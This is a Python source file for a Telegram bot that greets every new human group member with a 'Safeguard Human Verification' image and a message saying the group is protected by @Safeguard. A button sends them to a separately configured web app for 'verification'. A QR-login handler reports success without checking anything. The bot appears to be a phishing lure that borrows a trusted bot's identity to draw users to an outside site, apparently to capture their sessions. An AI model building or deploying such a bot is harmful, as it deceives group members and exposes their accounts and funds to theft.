import os
import logging
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup 
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler 
from telegram.constants import ParseMode
from config import *

# Configure logging
logging.basicConfig(
    format=LOG_FORMAT,
    level=getattr(logging, LOG_LEVEL)
)
logger = logging.getLogger(__name__)

class TelegramBot:
    def __init__(self, token: str = None):
        self.token = token or BOT_TOKEN
        self.bot_username = BOT_USERNAME
        self.app = Application.builder().token(self.token).build()
        self.setup_handlers()
    
    def setup_handlers(self):
        """Setup all bot handlers"""
        # Handle /start command
        self.app.add_handler(CommandHandler("start", self.start_command))
        
        # Handle new chat members (when users join groups)
        self.app.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, self.handle_new_member))
        
        # Handle callback queries (button clicks)
        self.app.add_handler(CallbackQueryHandler(self.handle_callback))
        
        # Handle regular messages
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
        # Add a catch-all handler for debugging
        self.app.add_handler(MessageHandler(filters.ALL, self.debug_handler))
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user = update.effective_user
        message_text = update.message.text
        
        # Check if this is a QR code login
        if message_text.startswith('/start qr_'):
            qr_session_id = message_text.split('qr_')[1]
            await self.handle_qr_login(update, context, qr_session_id)
            return
        
        welcome_text = START_MESSAGE.format(user_name=user.first_name)
        
        keyboard = [
            [InlineKeyboardButton(VERIFY_BUTTON_TEXT, url=WEBAPP_URL)]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            welcome_text,
            reply_markup=reply_markup,
            parse_mode=ParseMode.HTML
        )
    
    async def handle_qr_login(self, update: Update, context: ContextTypes.DEFAULT_TYPE, qr_session_id: str):
        """Handle QR code login"""
        user = update.effective_user
        
        # Verify the QR session (in real implementation, this would check against your web app)
        success_text = f"✅ QR Code verified successfully!\n\nWelcome {user.first_name} to SAFE GUARD BOT!"
        
        await update.message.reply_text(
            success_text,
            parse_mode=ParseMode.HTML
        )
        
        # Log the QR login
        logger.info(f"QR login successful for user {user.id} with session {qr_session_id}")

    async def handle_new_member(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle when new users join a group"""
        chat = update.effective_chat
        logger.info(f"🆕 New member event detected in chat: {chat.id} ({chat.title})")
        new_members = update.message.new_chat_members
        logger.info(f"👥 New members: {[f'{m.first_name} (ID: {m.id}, Bot: {m.is_bot})' for m in new_members]}")
        for new_member in new_members:
            if not new_member.is_bot:
                logger.info(f"👤 Processing new human member: {new_member.first_name} (ID: {new_member.id})")
                logger.info(f"📝 Message ID: {update.message.message_id}")
                logger.info(f"📝 Chat Type: {chat.type}")
                logger.info(f"📝 Chat Title: {chat.title}")
                # 1. Send the Safeguard Human Verification image
                try:
                    with open(os.path.join('static', '6042991034281080163 (1).jpg'), 'rb') as photo_file:
                        await update.message.reply_photo(photo=photo_file)
                except Exception as e:
                    logger.error(f"❌ Failed to send verification image: {e}")
                # 2. Send the styled welcome message
                welcome_text = (
                    'This group is being protected by '
                    '<a href="https://t.me/safeguard_bot">@Safeguard</a>.'
                    '\n\nClick below or <a href="{webapp_url}">this link</a> to start human verification.'
                ).format(webapp_url=WEBAPP_URL)
                keyboard = [
                    [InlineKeyboardButton(VERIFY_BUTTON_TEXT, url=WEBAPP_URL)]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                try:
                    await update.message.reply_text(
                        welcome_text,
                        reply_markup=reply_markup,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True
                    )
                    logger.info(f"✅ Welcome message sent for new member {new_member.id} in chat {chat.id}")
                except Exception as e:
                    logger.error(f"❌ Failed to send welcome message: {e}")
            else:
                logger.info(f"🤖 Skipping bot member: {new_member.first_name}")
    
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callback queries"""
        query = update.callback_query
        await query.answer()
        
        # Handle different callback data here
        if query.data == "verify":
            await query.edit_message_text("🔐 Please click the verification link to proceed.")
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle regular text messages"""
        user = update.effective_user
        message_text = update.message.text
        
        # You can add custom message handling logic here
        if "verify" in message_text.lower():
            keyboard = [
                [InlineKeyboardButton(VERIFY_BUTTON_TEXT, url=WEBAPP_URL)]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                "🔐 Please verify your account to proceed.",
                reply_markup=reply_markup
            )
    
    async def debug_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Debug handler to catch all messages"""
        logger.info(f"🔍 DEBUG: Received message in chat {update.effective_chat.id}")
        logger.info(f"🔍 DEBUG: Message type: {type(update.message).__name__}")
        logger.info(f"🔍 DEBUG: Message content: {list(update.message.__dict__.keys())}")
        
        # Check if this is a new member message
        if hasattr(update.message, 'new_chat_members') and update.message.new_chat_members:
            logger.info(f"🔍 DEBUG: New chat members detected: {len(update.message.new_chat_members)}")
            for member in update.message.new_chat_members:
                logger.info(f"🔍 DEBUG: Member: {member.first_name} (Bot: {member.is_bot})")
    
    async def send_verification_message(self, chat_id: int, user_name: str = None):
        """Send verification message to a specific chat"""
        text = VERIFICATION_MESSAGE.format(bot_username=self.bot_username)
        
        keyboard = [
            [InlineKeyboardButton(VERIFY_BUTTON_TEXT, url=WEBAPP_URL)]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            await self.app.bot.send_message(
                chat_id=chat_id,
                text=text,
                reply_markup=reply_markup,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
            return True
        except Exception as e:
            logger.error(f"Failed to send verification message to {chat_id}: {e}")
            return False
    
    def run(self):
        """Start the bot"""
        logger.info("🤖 Starting Safeguard Bot...")
        logger.info(f"🔑 Bot Token: {self.token[:10]}...")
        logger.info(f"👤 Bot Username: @{self.bot_username}")
        logger.info(f"🌐 Web App URL: {WEBAPP_URL}")
        logger.info("📡 Bot is now polling for updates...")
        logger.info("💡 Make sure the bot is added to groups with proper permissions")
        logger.info("🔧 Run fix_bot_permissions.py to diagnose permission issues")
        
        try:
            self.app.run_polling()
        except Exception as e:
            logger.error(f"❌ Bot polling error: {e}")
            logger.error("💡 Common solutions:")
            logger.error("   1. Check if bot token is valid")
            logger.error("   2. Ensure bot is added to groups")
            logger.error("   3. Verify bot has proper permissions")
            raise

def main():
    """Main function to run the bot"""
    # Create and run the bot
    bot = TelegramBot()
    bot.run()

if __name__ == "__main__":
    main() 